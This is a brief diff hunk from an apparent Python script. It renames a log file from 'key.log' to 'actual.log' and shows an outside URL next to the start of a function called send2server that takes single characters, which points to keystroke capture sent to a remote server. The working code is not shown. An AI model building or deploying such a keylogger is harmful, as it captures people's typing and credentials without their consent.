@@ -5,7 +5,7 @@ import getpass
 import os
 import socket
 
-log_file='key.log'
+log_file='actual.log'
 url = 'https://apps.arachnis.org/pt-project/'
 
 def send2server(ch):
